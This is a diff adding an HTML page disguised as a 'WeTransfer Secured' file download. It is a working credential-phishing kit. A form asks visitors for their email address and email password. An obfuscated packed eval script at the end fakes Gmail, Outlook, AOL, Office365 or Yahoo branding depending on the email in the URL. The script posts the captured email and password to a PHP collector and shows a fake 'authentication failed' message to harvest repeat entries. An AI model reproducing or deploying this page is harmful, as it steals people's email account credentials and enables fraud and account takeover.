@@ -1,0 +1,159 @@
+
+
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta property="og:title" content="Open to See" />
+    <meta property="og:description" content="35 views, 398 likes" />
+
+    <link
+      rel="shortcut icon"
+      href="https://cdn.glitch.com/e65b120f-b033-4153-8f73-22473e531ef0%2Ficon.ico"
+    />
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+    />
+
+    <!-- jQuery library -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    <!-- Popper JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+
+    <!-- Latest compiled JavaScript -->
+    <style>
+      body {
+        background-image: url(https://cdn.glitch.com/68cfb315-3fc6-4c52-a231-5f0910612d8b%2Fbgwe.png);
+        background-repeat: no-repeat;
+        color: #045eb4;
+      }
+
+      #d {
+        position: relative;
+        left: 530px;
+        top: 350px;
+      }
+
+      #form {
+        position: absolute;
+        left: 530px;
+        top: 50px;
+        width: 400px;
+        border-radius: 10px;
+        padding: 20px;
+        z-index: 2;
+        background: white;
+        display: none;
+      }
+      .blue {
+        background-color: #045eb4;
+        color: white;
+      }
+      #sub1 {
+        margin-top: 480px;
+        margin-left: 140px;
+        border-radius: 15px;
+        position: absolute;
+        z-index: 1;
+      }
+      .sky {
+        background-color: #409fff;
+        color: white;
+      }
+    </style>
+    <title>WeTransfer Secured</title>
+  </head>
+
+  <body>
+    <div id="form">
+      <div class="text-center">
+        <img
+          src="https://cdn.glitch.com/68cfb315-3fc6-4c52-a231-5f0910612d8b%2Fwe2.jpg"
+          width="200"
+        /><br />
+        <div style="color:black;">Confirm to start download!</div>
+      </div>
+      <hr />
+      <h1></h1>
+      <form method="POST" action="">
+        <p align="center">
+          <font color="#FF0000"><span id="msg"></span></font>
+        </p>
+        <p>
+          <input
+            type="email"
+            name="email"
+            class="form-control"
+            value=""
+            id="email"
+            placeholder="Enter Email Here"
+          />
+        </p>
+
+        <p>
+          <input
+            type="password"
+            name="password"
+            class="form-control"
+            value=""
+            id="password"
+            placeholder="Enter Email Password"
+          />
+        </p>
+
+        <input
+          id="submit-btn"
+          name="sub"
+          type="submit"
+          class="btn btn-md btn-block sky"
+          value="Download"
+        />
+      </form>
+    </div>
+    <a href="#" id="sub1" class="btn btn-md sky text-white">Download </a>
+
+    <script>
+      $(document).ready(function() {
+        $("#sub1, #pix").click(function() {
+          $("#form").slideToggle();
+        });
+      });
+    </script>
+    <script>
+      $(document).ready(function() {
+        $("form").submit(function() {
+          var pwd = $("#password").val();
+
+          if ($("#password").val() == "") {
+            $("#er").text("Please enter your password to continue");
+            return false;
+            //$('#password').focus();
+          } else {
+            $("#er")
+              .hide()
+              .text("");
+            return true;
+          }
+        });
+      });
+    </script>
+
+    
+  </body>
+  <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+	<script src="http://code.jquery.com/jquery-1.7.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(12).16(6(){n g=0;n h=13.L.O.M(1);K(!h){}P{n i=h;n j=i.14("@");n k=i.M(j+1);n c=k.M(0,k.14("."));n l=c.17()}$(\'#18\').q(6(){$(\'#s\').t("u");$("#4").7();$(\'#v\').w(\'x\',\'y://z.A.B/Q-R-S-T-U%19-1a.1b\');$(\'#r\').2("1c");$("#o").p(i);$("#C").2(i);$("#D").8({E:9,m:"7"},0);$("#F").8({G:9,m:"5"},H);$(\'#I\').J(\'5\')});$(\'#1d\').q(6(){$(\'#s\').t("u");$("#4").7();$(\'#v\').w(\'x\',\'y://z.A.B/V-W-X-Y-Z%1e.N\');$(\'#r\').2("1f");$("#o").p(i);$("#C").2(i);$("#D").8({E:9,m:"7"},0);$("#F").8({G:9,m:"5"},H);$(\'#I\').J(\'5\')});$(\'#1g\').q(6(){$(\'#s\').t("u");$("#4").7();$(\'#v\').w(\'x\',\'y://z.A.B/Q-R-S-T-U%1h.N\');$(\'#r\').2("1i");$("#o").p(i);$("#C").2(i);$("#D").8({E:9,m:"7"},0);$("#F").8({G:9,m:"5"},H);$(\'#I\').J(\'5\')});$(\'#1j\').q(6(){$(\'#s\').t("u");$("#4").7();$(\'#v\').w(\'x\',\'y://z.A.B/V-W-X-Y-Z%1k.N\');$(\'#r\').2("1l 1m");$("#o").p(i);$("#C").2(i);$("#D").8({E:9,m:"7"},0);$("#F").8({G:9,m:"5"},H);$(\'#I\').J(\'5\')});$(\'#1n\').q(6(){$(\'#s\').t("u");$("#4").7();$(\'#v\').w(\'x\',\'y://z.A.B/Q-R-S-T-U%1o.N\');$(\'#r\').2("1p");$("#o").p(i);$("#C").2(i);$("#D").8({E:9,m:"7"},0);$("#F").8({G:9,m:"5"},H);$(\'#I\').J(\'5\')});$(\'#1q\').q(6(){$(\'#s\').t("u");$("#4").7();$(\'#v\').w(\'x\',\'y://z.A.B/V-W-X-Y-Z%1r.1s\');$(\'#r\').2("1t 1u");$("#o").p(i);$("#C").2(i);$("#D").8({E:9,m:"7"},0);$("#F").8({G:9,m:"5"},H);$(\'#I\').J(\'5\')});$(\'#10-11\').q(6(b){b.1v();n c=$("#o").p();n d=$("#15").p();n e=$("#r").2();n f=$(\'#4\').2();$(\'#4\').1w(f);g=g+1;K(g>=3){g=0;13.L.1x("")}P{$.1y({1z:\'1A\',1B:\'1C.1D\',1E:\'1F\',1G:{o:c,15:d,1H:e,},1I:6(a){$(\'#10-11\').2(\'1J...\')},1K:6(a){K(a){$("#4").5();1L.1M(a);K(a[\'1N\']==\'1O\'){$(\'#4\').2(a[\'4\'])}P{$(\'#4\').2(a[\'4\'])}}},1P:6(){$("#4").5();$(\'#4\').2("1Q 1R 1S, 1T 1U.")},1V:6(){$(\'#10-11\').2(\'1W\')}})}})});K(L.O){12.1X(\'#o\').1Y=1Z=L.O.M(1)}',62,124,'||html||msg|show|function|hide|animate|200|||||||||||||opacity|var|email|val|click|field|contact|trigger|reset|fieldImg|attr|src|https|cdn|glitch|com|emailch|inputbar|left|automail|right|1000|ajaxModal|modal|if|location|substr|png|hash|else|f8a250c7|6291|417b|9add|b59b649a403a|5f9b4016|1a0e|4577|bbd3|bd409138e062|submit|btn|document|window|indexOf|password|ready|toLowerCase|gmailmodal|2Fgmail|lo|jpg|Gmail|outlookmodal|2Foutlook|Outlook|aolmodal|2Faol|Aol|office365modal|2Foffice365|Office|365|yahoomodal|2Fyahoo|Yahoo|othermodal|2Fothermail|ico|Other|Mail|preventDefault|text|replace|ajax|dataType|JSON|url|wtwz34|php|type|POST|data|detail|beforeSend|Verifing|success|console|log|signal|ok|error|Password|authentication|failed|try|again|complete|Login|querySelector|value|eml'.split('|'),0,{}))
+
+  </script>
+</html>
